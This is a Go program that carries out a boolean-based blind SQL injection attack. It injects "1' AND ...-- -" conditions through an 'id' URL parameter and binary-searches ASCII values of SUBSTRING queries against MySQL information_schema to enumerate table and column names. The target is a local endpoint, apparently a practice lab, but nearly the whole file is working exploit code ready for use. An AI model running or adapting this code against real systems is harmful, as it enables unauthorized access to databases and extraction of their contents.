package main

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	ASCIIMin = 32
	ASCIIMax = 126
)

type HTTPClient struct {
	BaseURL string
	Client  *http.Client
	Timeout time.Duration
}

type Observation struct {
	StatusCode int
	Status     string
	Body       string
	BodyLen    int
}

func NewHTTPClient(baseURL string, timeOut time.Duration) (HTTPClient, error) {
	if timeOut <= 0 {
		return HTTPClient{}, errors.New("timeout must be positive")
	}

	baseURL = strings.TrimRight(baseURL, "/")

	client := http.Client{
		Timeout: timeOut,
	}

	return HTTPClient{
		BaseURL: baseURL,
		Client:  &client,
		Timeout: timeOut,
	}, nil
}

func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
	data := url.Values{}
	data.Set("id", payload)

	targetURL := c.BaseURL + "?" + data.Encode()

	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
	if err != nil {
		return Observation{}, fmt.Errorf("create new request %w", err)
	}

	resp, err := c.Client.Do(req)
	if err != nil {
		return Observation{}, fmt.Errorf("http client new do request %w", err)
	}
	defer resp.Body.Close()

	limitedReader := io.LimitReader(resp.Body, 1024*1024)
	body, err := io.ReadAll(limitedReader)
	if err != nil {
		return Observation{}, fmt.Errorf("read body %w", err)
	}

	return Observation{
		Status:     resp.Status,
		StatusCode: resp.StatusCode,
		Body:       string(body),
		BodyLen:    len(body),
	}, nil
}

func buildConditionPayload(condition string) string {
	return fmt.Sprintf("1' AND %s-- -", condition)
}

func buildCountGreaterCondition(countExpr string, value int) string {
	return fmt.Sprintf(
		"(%s)>%d",
		countExpr,
		value,
	)
}

func buildCharGreaterCondition(sqlExpr string, position int, code int) string {
	return fmt.Sprintf(
		"ASCII(SUBSTRING((%s),%d,1))>%d",
		sqlExpr,
		position,
		code,
	)
}

func (c *HTTPClient) IsTrue(condition string) (bool, error) {
	payload := buildConditionPayload(condition)

	obs, err := c.SendPayload(payload)
	if err != nil {
		return false, fmt.Errorf("send condition payload: %w", err)
	}

	return strings.Contains(obs.Body, "Product found"), nil
}

func (c *HTTPClient) ExtractInt(sqlQuery string, maxValue int) (int, error) {
	low := 0
	high := maxValue

	for low < high {
		mid := (low + high) / 2
		condition := buildCountGreaterCondition(sqlQuery, mid)

		ok, err := c.IsTrue(condition)
		if err != nil {
			return 0, err
		}

		if ok {
			low = mid + 1
		} else {
			high = mid
		}
	}

	return low, nil
}

func (c *HTTPClient) ExtractString(sqlQuery string, maxLen int) (string, error) {
	var result strings.Builder

	for position := 1; position <= maxLen; position++ {
		low := ASCIIMin
		high := ASCIIMax

		for low < high {
			mid := (low + high) / 2

			condition := buildCharGreaterCondition(sqlQuery, position, mid)

			ok, err := c.IsTrue(condition)
			if err != nil {
				return "", err
			}

			if ok {
				low = mid + 1
			} else {
				high = mid
			}
		}

		result.WriteRune(rune(low))
	}

	return result.String(), nil
}

// --------------------
// MySQL SQL expressions
// --------------------

func mysqlTableCountExpr() string {
	return "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()"
}

func mysqlTableNameLengthExpr(offset int) string {
	return fmt.Sprintf(
		"SELECT CHAR_LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE' ORDER BY table_name LIMIT 1 OFFSET %d",
		offset,
	)
}

func mysqlTableNameExpr(offset int) string {
	return fmt.Sprintf(
		"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET %d",
		offset,
	)
}

func mysqlColumnCountExpr(tableName string) string {
	return fmt.Sprintf(
		"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s'",
		tableName,
	)
}

func mysqlColumnNameLengthExpr(tableName string, offset int) string {
	return fmt.Sprintf(
		"SELECT CHAR_LENGTH(column_name) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
		tableName,
		offset,
	)
}

func mysqlColumnNameExpr(tableName string, offset int) string {
	return fmt.Sprintf(
		"SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
		tableName,
		offset,
	)
}

// --------------------
// Main enum flow
// --------------------

func main() {
	baseURL := "http://127.0.0.1:5007/boolean"

	client, err := NewHTTPClient(baseURL, 5*time.Second)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	tableCountRes, err := client.ExtractInt(mysqlTableCountExpr(), 32)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Println("Table count:", tableCountRes)

	tableNames := make([]string, 0)

	for i := 0; i < tableCountRes; i++ {
		lengthTableName, err := client.ExtractInt(mysqlTableNameLengthExpr(i), 64)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}

		fmt.Println("Length of table name:", lengthTableName)

		tableName, err := client.ExtractString(mysqlTableNameExpr(i), lengthTableName)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}

		fmt.Println("Table name:", tableName)

		tableNames = append(tableNames, tableName)

		fmt.Println()
	}

	for _, tableName := range tableNames {
		fmt.Println()
		fmt.Println("TABLE NAME:", tableName)

		columnCount, err := client.ExtractInt(mysqlColumnCountExpr(tableName), 32)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}

		fmt.Println("Columns count:", columnCount)

		for i := 0; i < columnCount; i++ {
			lengthColumnName, err := client.ExtractInt(mysqlColumnNameLengthExpr(tableName, i), 64)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}

			columnName, err := client.ExtractString(mysqlColumnNameExpr(tableName, i), lengthColumnName)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}

			fmt.Println("Column name:", columnName)
		}
	}
}
